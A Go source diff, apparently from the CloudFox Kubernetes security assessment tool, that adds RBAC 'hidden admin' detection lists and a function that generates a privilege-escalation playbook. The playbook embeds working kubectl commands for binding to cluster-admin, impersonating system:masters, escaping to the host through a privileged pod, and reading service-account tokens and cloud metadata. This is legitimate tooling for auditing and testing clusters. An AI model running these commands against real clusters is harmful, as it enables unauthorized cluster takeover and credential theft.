@@ -79,6 +79,49 @@ type DataExfilPermission struct {
 	Description string `json:"description"`
 }
 
+// HiddenAdminPermission represents a permission that indicates hidden administrative access (IAM/RBAC escalation)
+type HiddenAdminPermission struct {
+	Verb        string `json:"verb"`
+	Resource    string `json:"resource"`
+	APIGroup    string `json:"apiGroup"`
+	Category    string `json:"category"`
+	RiskLevel   string `json:"riskLevel"`
+	Description string `json:"description"`
+}
+
+// HiddenAdminFinding represents a hidden admin finding with full context
+type HiddenAdminFinding struct {
+	Principal      string   `json:"principal"`
+	PrincipalType  string   `json:"principalType"` // User, Group, ServiceAccount
+	Namespace      string   `json:"namespace"`
+	Scope          string   `json:"scope"` // cluster, namespace
+	RoleName       string   `json:"roleName"`
+	BindingName    string   `json:"bindingName"`
+	RiskLevel      string   `json:"riskLevel"`
+	Permissions    []string `json:"permissions"`
+	Description    string   `json:"description"`
+	CloudIAM       string   `json:"cloudIAM"`       // AWS/GCP/Azure IAM role if annotated
+	ActivePods     int      `json:"activePods"`     // Number of pods using this SA
+	IsDefault      bool     `json:"isDefault"`      // Is this the default SA
+	IsWildcard     bool     `json:"isWildcard"`     // Is this a wildcard group binding
+	IsAggregation  bool     `json:"isAggregation"`  // Is this from an aggregation role
+	AttackSteps    []string `json:"attackSteps"`    // Steps in the attack path
+	Feasibility    string   `json:"feasibility"`    // Immediate, Requires-Enum, Complex
+	ExploitCommand string   `json:"exploitCommand"`
+}
+
+// HiddenAdminData holds all hidden admin findings
+type HiddenAdminData struct {
+	ClusterAdmins       []HiddenAdminFinding `json:"clusterAdmins"`       // cluster-admin or system:masters
+	RBACModifiers       []HiddenAdminFinding `json:"rbacModifiers"`       // Can modify RBAC
+	Impersonators       []HiddenAdminFinding `json:"impersonators"`       // Can impersonate
+	CertApprovers       []HiddenAdminFinding `json:"certApprovers"`       // Can approve CSRs
+	AggregationRoles    []HiddenAdminFinding `json:"aggregationRoles"`    // Aggregation roles
+	WildcardBindings    []HiddenAdminFinding `json:"wildcardBindings"`    // Wildcard group bindings
+	DefaultSAElevations []HiddenAdminFinding `json:"defaultSAElevations"` // Default SA with elevated perms
+	AllFindings         []HiddenAdminFinding `json:"allFindings"`
+}
+
 // AttackPath represents an attack path (exfil, lateral, or privesc)
 type AttackPath struct {
 	Principal      string   `json:"principal"`
@@ -276,6 +319,55 @@ func GetDataExfilPermissions() []DataExfilPermission {
 
 		// Etcd (if accessible) - CRITICAL
 		{Verb: "get", Resource: "pods/exec", APIGroup: "", Category: "Etcd Access", RiskLevel: shared.RiskCritical, Description: "Exec access to etcd pods for database dump"},
+	}
+}
+
+// GetHiddenAdminPermissions returns permissions that indicate hidden administrative access (IAM/RBAC escalation)
+// These are specifically focused on RBAC manipulation and identity escalation, not general privesc
+func GetHiddenAdminPermissions() []HiddenAdminPermission {
+	return []HiddenAdminPermission{
+		// RBAC Modification - Can escalate privileges by modifying roles/bindings
+		{Verb: "create", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can create ClusterRoles with arbitrary permissions"},
+		{Verb: "update", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can modify ClusterRoles to add permissions"},
+		{Verb: "patch", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can patch ClusterRoles to add permissions"},
+		{Verb: "delete", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can delete ClusterRoles to weaken security"},
+
+		{Verb: "create", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can bind any identity to cluster-admin"},
+		{Verb: "update", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can modify ClusterRoleBindings to escalate privileges"},
+		{Verb: "patch", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can patch ClusterRoleBindings to escalate privileges"},
+		{Verb: "delete", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can delete ClusterRoleBindings to remove access controls"},
+
+		{Verb: "create", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can create Roles with arbitrary namespace permissions"},
+		{Verb: "update", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can modify Roles to add permissions"},
+		{Verb: "patch", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can patch Roles to add permissions"},
+
+		{Verb: "create", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can bind any identity to admin in namespace"},
+		{Verb: "update", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can modify RoleBindings to escalate privileges"},
+		{Verb: "patch", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can patch RoleBindings to escalate privileges"},
+
+		// RBAC Special Verbs - Bypass escalation prevention
+		{Verb: "bind", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Can bind any ClusterRole without having its permissions"},
+		{Verb: "bind", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Can bind any Role without having its permissions"},
+		{Verb: "escalate", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Can create/update ClusterRoles with permissions not held"},
+		{Verb: "escalate", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Can create/update Roles with permissions not held"},
+
+		// Impersonation - Can act as other identities
+		{Verb: "impersonate", Resource: "users", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskCritical, Description: "Can impersonate any user including system:admin"},
+		{Verb: "impersonate", Resource: "groups", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskCritical, Description: "Can impersonate any group including system:masters"},
+		{Verb: "impersonate", Resource: "serviceaccounts", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskHigh, Description: "Can impersonate any ServiceAccount"},
+		{Verb: "impersonate", Resource: "userextras/*", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskHigh, Description: "Can impersonate with extra user info"},
+
+		// Certificate Signing - Can create new cluster identities
+		{Verb: "create", Resource: "certificatesigningrequests", APIGroup: "certificates.k8s.io", Category: "Certificate Approval", RiskLevel: shared.RiskHigh, Description: "Can submit CSRs for new identities"},
+		{Verb: "update", Resource: "certificatesigningrequests/approval", APIGroup: "certificates.k8s.io", Category: "Certificate Approval", RiskLevel: shared.RiskCritical, Description: "Can approve CSRs to generate valid certificates"},
+		{Verb: "approve", Resource: "certificatesigningrequests/approval", APIGroup: "certificates.k8s.io", Category: "Certificate Approval", RiskLevel: shared.RiskCritical, Description: "Can approve CSRs for system:masters"},
+
+		// Wildcard access on RBAC - Catch-all for full RBAC control
+		{Verb: "*", Resource: "*", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskCritical, Description: "Full control over all RBAC resources"},
+		{Verb: "*", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskCritical, Description: "Full control over ClusterRoles"},
+		{Verb: "*", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskCritical, Description: "Full control over ClusterRoleBindings"},
+		{Verb: "*", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskHigh, Description: "Full control over Roles"},
+		{Verb: "*", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskHigh, Description: "Full control over RoleBindings"},
 	}
 }
 
@@ -500,14 +592,14 @@ func apiGroupMatchesRule(ruleGroup, permGroup string) bool {
 	return ruleGroup == "*" || ruleGroup == permGroup
 }
 
-// matchedPermission holds a matched permission with its resolved verb/resource for exploit generation
-type matchedPermission struct {
-	category        string
-	riskLevel       string
-	description     string
-	matchedVerb     string // The actual verb from the permission definition (not the wildcard)
-	matchedResource string // The actual resource from the permission definition
-	matchedAPIGroup string // The API group from the permission definition
+// MatchedPermission holds a matched permission with its resolved verb/resource for exploit generation
+type MatchedPermission struct {
+	Category        string
+	RiskLevel       string
+	Description     string
+	MatchedVerb     string // The actual verb from the permission definition (not the wildcard)
+	MatchedResource string // The actual resource from the permission definition
+	MatchedAPIGroup string // The API group from the permission definition
 }
 
 // crdAPIGroups contains API groups that indicate CRD-based resources
@@ -532,10 +624,11 @@ func sourceTypeForAPIGroup(apiGroup string) string {
 	return "core"
 }
 
-// findMatchingPrivescPermissions returns all privesc permissions that a given RBAC rule grants.
+// FindMatchingPrivescPermissions returns all privesc permissions that a given RBAC rule grants.
 // This properly expands wildcards: e.g., verb "*" + resource "nodes/proxy" matches "get nodes/proxy".
-func findMatchingPrivescPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
-	var matches []matchedPermission
+// This function is exported for use by other modules like namespaces.go
+func FindMatchingPrivescPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []MatchedPermission {
+	var matches []MatchedPermission
 	seen := make(map[string]bool) // deduplicate by category+resource
 
 	for _, perm := range GetPrivescPermissions() {
@@ -549,22 +642,23 @@ func findMatchingPrivescPermissions(ruleVerb, ruleResource, ruleAPIGroup string)
 			}
 			seen[key] = true
 
-			matches = append(matches, matchedPermission{
-				category:        perm.Category,
-				riskLevel:       perm.RiskLevel,
-				description:     perm.Description,
-				matchedVerb:     perm.Verb,
-				matchedResource: perm.Resource,
-				matchedAPIGroup: perm.APIGroup,
+			matches = append(matches, MatchedPermission{
+				Category:        perm.Category,
+				RiskLevel:       perm.RiskLevel,
+				Description:     perm.Description,
+				MatchedVerb:     perm.Verb,
+				MatchedResource: perm.Resource,
+				MatchedAPIGroup: perm.APIGroup,
 			})
 		}
 	}
 	return matches
 }
 
-// findMatchingLateralPermissions returns all lateral movement permissions that a given RBAC rule grants.
-func findMatchingLateralPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
-	var matches []matchedPermission
+// FindMatchingLateralPermissions returns all lateral movement permissions that a given RBAC rule grants.
+// This function is exported for use by other modules like namespaces.go
+func FindMatchingLateralPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []MatchedPermission {
+	var matches []MatchedPermission
 	seen := make(map[string]bool)
 
 	for _, perm := range GetLateralMovementPermissions() {
@@ -578,22 +672,23 @@ func findMatchingLateralPermissions(ruleVerb, ruleResource, ruleAPIGroup string)
 			}
 			seen[key] = true
 
-			matches = append(matches, matchedPermission{
-				category:        perm.Category,
-				riskLevel:       perm.RiskLevel,
-				description:     perm.Description,
-				matchedVerb:     perm.Verb,
-				matchedResource: perm.Resource,
-				matchedAPIGroup: perm.APIGroup,
+			matches = append(matches, MatchedPermission{
+				Category:        perm.Category,
+				RiskLevel:       perm.RiskLevel,
+				Description:     perm.Description,
+				MatchedVerb:     perm.Verb,
+				MatchedResource: perm.Resource,
+				MatchedAPIGroup: perm.APIGroup,
 			})
 		}
 	}
 	return matches
 }
 
-// findMatchingExfilPermissions returns all data exfil permissions that a given RBAC rule grants.
-func findMatchingExfilPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []matchedPermission {
-	var matches []matchedPermission
+// FindMatchingExfilPermissions returns all data exfil permissions that a given RBAC rule grants.
+// This function is exported for use by other modules like namespaces.go
+func FindMatchingExfilPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []MatchedPermission {
+	var matches []MatchedPermission
 	seen := make(map[string]bool)
 
 	for _, perm := range GetDataExfilPermissions() {
@@ -607,17 +702,202 @@ func findMatchingExfilPermissions(ruleVerb, ruleResource, ruleAPIGroup string) [
 			}
 			seen[key] = true
 
-			matches = append(matches, matchedPermission{
-				category:        perm.Category,
-				riskLevel:       perm.RiskLevel,
-				description:     perm.Description,
-				matchedVerb:     perm.Verb,
-				matchedResource: perm.Resource,
-				matchedAPIGroup: perm.APIGroup,
+			matches = append(matches, MatchedPermission{
+				Category:        perm.Category,
+				RiskLevel:       perm.RiskLevel,
+				Description:     perm.Description,
+				MatchedVerb:     perm.Verb,
+				MatchedResource: perm.Resource,
+				MatchedAPIGroup: perm.APIGroup,
 			})
 		}
 	}
 	return matches
+}
+
+// FindMatchingHiddenAdminPermissions returns all hidden admin permissions that a given RBAC rule grants.
+// This function is exported for use by other modules like hidden_admins.go
+func FindMatchingHiddenAdminPermissions(ruleVerb, ruleResource, ruleAPIGroup string) []MatchedPermission {
+	var matches []MatchedPermission
+	seen := make(map[string]bool)
+
+	for _, perm := range GetHiddenAdminPermissions() {
+		if verbMatchesRule(ruleVerb, perm.Verb) &&
+			resourceMatchesRule(ruleResource, perm.Resource) &&
+			apiGroupMatchesRule(ruleAPIGroup, perm.APIGroup) {
+
+			key := perm.Category + ":" + perm.Resource + ":" + perm.Verb
+			if seen[key] {
+				continue
+			}
+			seen[key] = true
+
+			matches = append(matches, MatchedPermission{
+				Category:        perm.Category,
+				RiskLevel:       perm.RiskLevel,
+				Description:     perm.Description,
+				MatchedVerb:     perm.Verb,
+				MatchedResource: perm.Resource,
+				MatchedAPIGroup: perm.APIGroup,
+			})
+		}
+	}
+	return matches
+}
+
+// =============================================================================
+// Helper Functions for External Use
+// These functions allow other modules (namespaces.go, hidden_admins.go) to use
+// the centralized attack path detection logic without duplicating permission lists.
+// =============================================================================
+
+// HasDangerousPermissions checks if the given RBAC rules contain any dangerous permissions
+// (privesc, lateral movement, or data exfil). This is the centralized replacement for
+// hasDangerousPermissions() in namespaces.go.
+func HasDangerousPermissions(rules []v1.PolicyRule) bool {
+	for _, rule := range rules {
+		for _, verb := range rule.Verbs {
+			for _, resource := range rule.Resources {
+				apiGroups := rule.APIGroups
+				if len(apiGroups) == 0 {
+					apiGroups = []string{""}
+				}
+				for _, apiGroup := range apiGroups {
+					// Check for any type of dangerous permission
+					if len(FindMatchingPrivescPermissions(verb, resource, apiGroup)) > 0 ||
+						len(FindMatchingLateralPermissions(verb, resource, apiGroup)) > 0 ||
+						len(FindMatchingExfilPermissions(verb, resource, apiGroup)) > 0 {
+						return true
+					}
+				}
+			}
+		}
+	}
+	return false
+}
+
+// CheckPrivilegeEscalation checks if the rules allow privilege escalation and returns the reasons.
+// This is the centralized replacement for checkPrivilegeEscalation() in namespaces.go.
+func CheckPrivilegeEscalation(rules []v1.PolicyRule) (bool, []string) {
+	var reasons []string
+	seen := make(map[string]bool)
+
+	for _, rule := range rules {
+		for _, verb := range rule.Verbs {
+			for _, resource := range rule.Resources {
+				apiGroups := rule.APIGroups
+				if len(apiGroups) == 0 {
+					apiGroups = []string{""}
+				}
+				for _, apiGroup := range apiGroups {
+					for _, match := range FindMatchingPrivescPermissions(verb, resource, apiGroup) {
+						reason := match.Category
+						if !seen[reason] {
+							seen[reason] = true
+							reasons = append(reasons, reason)
+						}
+					}
+				}
+			}
+		}
+	}
+
+	return len(reasons) > 0, reasons
+}
+
+// GetDangerousPermissionsList returns a list of dangerous permissions in the rules.
+// This is the centralized replacement for getDangerousPermissionsList() in namespaces.go.
+func GetDangerousPermissionsList(rules []v1.PolicyRule) []string {
+	var perms []string
+	seen := make(map[string]bool)
+
+	for _, rule := range rules {
+		for _, verb := range rule.Verbs {
+			for _, resource := range rule.Resources {
+				apiGroups := rule.APIGroups
+				if len(apiGroups) == 0 {
+					apiGroups = []string{""}
+				}
+				for _, apiGroup := range apiGroups {
+					// Check privesc permissions
+					for _, match := range FindMatchingPrivescPermissions(verb, resource, apiGroup) {
+						perm := fmt.Sprintf("%s/%s", match.MatchedResource, match.MatchedVerb)
+						if !seen[perm] {
+							seen[perm] = true
+							perms = append(perms, perm)
+						}
+					}
+					// Check lateral movement permissions
+					for _, match := range FindMatchingLateralPermissions(verb, resource, apiGroup) {
+						perm := fmt.Sprintf("%s/%s", match.MatchedResource, match.MatchedVerb)
+						if !seen[perm] {
+							seen[perm] = true
+							perms = append(perms, perm)
+						}
+					}
+					// Check exfil permissions
+					for _, match := range FindMatchingExfilPermissions(verb, resource, apiGroup) {
+						perm := fmt.Sprintf("%s/%s", match.MatchedResource, match.MatchedVerb)
+						if !seen[perm] {
+							seen[perm] = true
+							perms = append(perms, perm)
+						}
+					}
+				}
+			}
+		}
+	}
+
+	return perms
+}
+
+// IsHiddenAdminRule checks if a rule grants IAM/RBAC escalation permissions.
+// This is the centralized replacement for isIAMRelatedRule() in hidden_admins.go.
+func IsHiddenAdminRule(rule v1.PolicyRule) bool {
+	for _, verb := range rule.Verbs {
+		for _, resource := range rule.Resources {
+			apiGroups := rule.APIGroups
+			if len(apiGroups) == 0 {
+				apiGroups = []string{""}
+			}
+			for _, apiGroup := range apiGroups {
+				if len(FindMatchingHiddenAdminPermissions(verb, resource, apiGroup)) > 0 {
+					return true
+				}
+			}
+		}
+	}
+	return false
+}
+
+// GetHiddenAdminRiskDescription returns a human-readable description of IAM/RBAC risks from a rule.
+// This is the centralized replacement for getIAMRiskDescription() in hidden_admins.go.
+func GetHiddenAdminRiskDescription(rule v1.PolicyRule) string {
+	var descriptions []string
+	seen := make(map[string]bool)
+
+	for _, verb := range rule.Verbs {
+		for _, resource := range rule.Resources {
+			apiGroups := rule.APIGroups
+			if len(apiGroups) == 0 {
+				apiGroups = []string{""}
+			}
+			for _, apiGroup := range apiGroups {
+				for _, match := range FindMatchingHiddenAdminPermissions(verb, resource, apiGroup) {
+					desc := match.Description
+					if !seen[desc] {
+						seen[desc] = true
+						descriptions = append(descriptions, desc)
+					}
+				}
+			}
+		}
+	}
+
+	if len(descriptions) == 0 {
+		return ""
+	}
+	return strings.Join(descriptions, "; ")
 }
 
 // analyzeRulesForAttackPaths analyzes RBAC rules for attack paths.
@@ -651,23 +931,23 @@ func (s *AttackPathService) analyzeRulesForAttackPaths(
 				for _, apiGroup := range apiGroups {
 					// Privesc analysis with wildcard expansion
 					if pathType == "privesc" || pathType == "all" {
-						for _, match := range findMatchingPrivescPermissions(verb, resource, apiGroup) {
+						for _, match := range FindMatchingPrivescPermissions(verb, resource, apiGroup) {
 							path := AttackPath{
 								Principal:      principal,
 								PrincipalType:  principalType,
-								Method:         match.category,
-								TargetResource: match.matchedResource,
+								Method:         match.Category,
+								TargetResource: match.MatchedResource,
 								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
-								Category:       match.category,
-								RiskLevel:      match.riskLevel,
-								Description:    match.description,
-								ExploitCommand: generateExploitCommand("privesc", match.matchedVerb, match.matchedResource, scopeID, principal),
+								Category:       match.Category,
+								RiskLevel:      match.RiskLevel,
+								Description:    match.Description,
+								ExploitCommand: generateExploitCommand("privesc", match.MatchedVerb, match.MatchedResource, scopeID, principal),
 								Namespace:      subject.Namespace,
 								ScopeType:      scopeType,
 								ScopeID:        scopeID,
 								ScopeName:      scopeName,
 								PathType:       "privesc",
-								SourceType:     sourceTypeForAPIGroup(match.matchedAPIGroup),
+								SourceType:     sourceTypeForAPIGroup(match.MatchedAPIGroup),
 								RoleName:       roleName,
 								BindingName:    bindingName,
 							}
@@ -677,23 +957,23 @@ func (s *AttackPathService) analyzeRulesForAttackPaths(
 
 					// Lateral movement analysis with wildcard expansion
 					if pathType == "lateral" || pathType == "all" {
-						for _, match := range findMatchingLateralPermissions(verb, resource, apiGroup) {
+						for _, match := range FindMatchingLateralPermissions(verb, resource, apiGroup) {
 							path := AttackPath{
 								Principal:      principal,
 								PrincipalType:  principalType,
-								Method:         match.category,
-								TargetResource: match.matchedResource,
+								Method:         match.Category,
+								TargetResource: match.MatchedResource,
 								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
-								Category:       match.category,
-								RiskLevel:      match.riskLevel,
-								Description:    match.description,
-								ExploitCommand: generateExploitCommand("lateral", match.matchedVerb, match.matchedResource, scopeID, principal),
+								Category:       match.Category,
+								RiskLevel:      match.RiskLevel,
+								Description:    match.Description,
+								ExploitCommand: generateExploitCommand("lateral", match.MatchedVerb, match.MatchedResource, scopeID, principal),
 								Namespace:      subject.Namespace,
 								ScopeType:      scopeType,
 								ScopeID:        scopeID,
 								ScopeName:      scopeName,
 								PathType:       "lateral",
-								SourceType:     sourceTypeForAPIGroup(match.matchedAPIGroup),
+								SourceType:     sourceTypeForAPIGroup(match.MatchedAPIGroup),
 								RoleName:       roleName,
 								BindingName:    bindingName,
 							}
@@ -703,23 +983,23 @@ func (s *AttackPathService) analyzeRulesForAttackPaths(
 
 					// Data exfiltration analysis with wildcard expansion
 					if pathType == "exfil" || pathType == "all" {
-						for _, match := range findMatchingExfilPermissions(verb, resource, apiGroup) {
+						for _, match := range FindMatchingExfilPermissions(verb, resource, apiGroup) {
 							path := AttackPath{
 								Principal:      principal,
 								PrincipalType:  principalType,
-								Method:         match.category,
-								TargetResource: match.matchedResource,
+								Method:         match.Category,
+								TargetResource: match.MatchedResource,
 								Permissions:    []string{fmt.Sprintf("%s %s", verb, resource)},
-								Category:       match.category,
-								RiskLevel:      match.riskLevel,
-								Description:    match.description,
-								ExploitCommand: generateExploitCommand("exfil", match.matchedVerb, match.matchedResource, scopeID, principal),
+								Category:       match.Category,
+								RiskLevel:      match.RiskLevel,
+								Description:    match.Description,
+								ExploitCommand: generateExploitCommand("exfil", match.MatchedVerb, match.MatchedResource, scopeID, principal),
 								Namespace:      subject.Namespace,
 								ScopeType:      scopeType,
 								ScopeID:        scopeID,
 								ScopeName:      scopeName,
 								PathType:       "exfil",
-								SourceType:     sourceTypeForAPIGroup(match.matchedAPIGroup),
+								SourceType:     sourceTypeForAPIGroup(match.MatchedAPIGroup),
 								RoleName:       roleName,
 								BindingName:    bindingName,
 							}
@@ -966,6 +1246,928 @@ func generateDynamicCRDExploitCommand(verb, resource, group, scope, principal st
 	}
 
 	return strings.Join(lines, "\n")
+}
+
+// GeneratePrivescPlaybook generates a comprehensive privilege escalation playbook from attack paths
+func GeneratePrivescPlaybook(paths []AttackPath, identityHeader string) string {
+	if len(paths) == 0 {
+		return ""
+	}
+
+	var sections strings.Builder
+	if identityHeader != "" {
+		sections.WriteString(fmt.Sprintf(`# Kubernetes Privilege Escalation Playbook for %s
+# Generated by CloudFox
+#
+# This playbook provides exploitation techniques for identified privilege escalation paths.
+
+`, identityHeader))
+	} else {
+		sections.WriteString(`# Kubernetes Privilege Escalation Playbook
+# Generated by CloudFox
+#
+# This playbook provides exploitation techniques for identified privilege escalation paths.
+
+`)
+	}
+
+	// Group paths by category
+	categories := map[string][]AttackPath{
+		"Cluster Admin":         {},
+		"RBAC Escalation":       {},
+		"Impersonation":         {},
+		"Pod Creation":          {},
+		"Pod Exec":              {},
+		"Workload Creation":     {},
+		"Pod Modification":      {},
+		"Workload Modification": {},
+		"Token Creation":        {},
+		"Node Access":           {},
+		"Webhook":               {},
+		"Certificate":           {},
+		"Storage":               {},
+		"CRD Management":        {},
+		"CRD Resource Access":   {},
+	}
+
+	for _, path := range paths {
+		if path.PathType != "privesc" {
+			continue
+		}
+		if _, ok := categories[path.Category]; ok {
+			categories[path.Category] = append(categories[path.Category], path)
+		}
+	}
+
+	// Cluster Admin
+	if len(categories["Cluster Admin"]) > 0 {
+		sections.WriteString("## Cluster Admin\n\n")
+		sections.WriteString("Principals with cluster-admin equivalent access have full control over the cluster.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Cluster Admin"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Full cluster access - can do anything\n")
+		sections.WriteString("kubectl get secrets -A\n")
+		sections.WriteString("kubectl get pods -A\n")
+		sections.WriteString("kubectl exec -it <pod> -- /bin/sh\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// RBAC Escalation
+	if len(categories["RBAC Escalation"]) > 0 {
+		sections.WriteString("## RBAC Escalation\n\n")
+		sections.WriteString("Principals with RBAC modification capabilities can escalate their privileges.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["RBAC Escalation"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create ClusterRoleBinding to cluster-admin\n")
+		sections.WriteString("kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<your-user>\n\n")
+		sections.WriteString("# Or create RoleBinding to admin in specific namespace\n")
+		sections.WriteString("kubectl -n <namespace> create rolebinding pwn --clusterrole=admin --user=<your-user>\n\n")
+		sections.WriteString("# Patch existing role to add wildcard permissions\n")
+		sections.WriteString("kubectl patch clusterrole <role-name> --type=json -p='[{\"op\":\"add\",\"path\":\"/rules/-\",\"value\":{\"apiGroups\":[\"*\"],\"resources\":[\"*\"],\"verbs\":[\"*\"]}}]'\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Impersonation
+	if len(categories["Impersonation"]) > 0 {
+		sections.WriteString("## Impersonation\n\n")
+		sections.WriteString("Principals with impersonation capabilities can act as other users, groups, or service accounts.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Impersonation"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.Description))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Impersonate cluster-admin user\n")
+		sections.WriteString("kubectl --as=system:admin get secrets -A\n\n")
+		sections.WriteString("# Impersonate system:masters group\n")
+		sections.WriteString("kubectl --as=dummy --as-group=system:masters get secrets -A\n\n")
+		sections.WriteString("# Impersonate a service account\n")
+		sections.WriteString("kubectl --as=system:serviceaccount:kube-system:default get secrets -A\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Pod Creation
+	if len(categories["Pod Creation"]) > 0 {
+		sections.WriteString("## Pod Creation\n\n")
+		sections.WriteString("Principals with pod creation capabilities can create privileged pods for container escape.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Pod Creation"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Create a privileged pod with host access\n")
+		sections.WriteString("kubectl run privesc --image=alpine --restart=Never --overrides='{\n")
+		sections.WriteString("  \"spec\":{\n")
+		sections.WriteString("    \"hostNetwork\":true,\"hostPID\":true,\"hostIPC\":true,\n")
+		sections.WriteString("    \"containers\":[{\n")
+		sections.WriteString("      \"name\":\"privesc\",\"image\":\"alpine\",\n")
+		sections.WriteString("      \"command\":[\"sh\",\"-c\",\"sleep 3600\"],\n")
+		sections.WriteString("      \"securityContext\":{\"privileged\":true},\n")
+		sections.WriteString("      \"volumeMounts\":[{\"name\":\"host\",\"mountPath\":\"/host\"}]\n")
+		sections.WriteString("    }],\n")
+		sections.WriteString("    \"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]\n")
+		sections.WriteString("  }\n")
+		sections.WriteString("}' -- sleep 3600\n\n")
+		sections.WriteString("# Access the host filesystem\n")
+		sections.WriteString("kubectl exec -it privesc -- chroot /host /bin/bash\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Pod Exec
+	if len(categories["Pod Exec"]) > 0 {
+		sections.WriteString("## Pod Exec\n\n")
+		sections.WriteString("Principals with pod exec capabilities can execute commands in running containers.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
+		for _, path := range categories["Pod Exec"] {
+			sections.WriteString(fmt.Sprintf("- %s (%s) via %s/%s - Scope: %s\n", path.Principal, path.PrincipalType, path.RoleName, path.BindingName, path.ScopeName))
+		}
+		sections.WriteString("\n### Exploitation:\n")
+		sections.WriteString("```bash\n")
+		sections.WriteString("# Exec into a pod to steal SA token or access sensitive data\n")
+		sections.WriteString("kubectl exec -it <pod-name> -- /bin/sh\n\n")
+		sections.WriteString("# Read the service account token\n")
+		sections.WriteString("kubectl exec <pod-name> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n")
+		sections.WriteString("# Look for cloud provider metadata\n")
+		sections.WriteString("kubectl exec <pod-name> -- curl -s http://169.254.169.254/latest/meta-data/\n")
+		sections.WriteString("```\n\n")
+	}
+
+	// Workload Creation
+	if len(categories["Workload Creation"]) > 0 {
+		sections.WriteString("## Workload Creation\n\n")
+		sections.WriteString("Principals with workload creation capabilities can create deployments/daemonsets with privileged SAs.\n\n")
+		sections.WriteString("### Principals with this capability:\n")
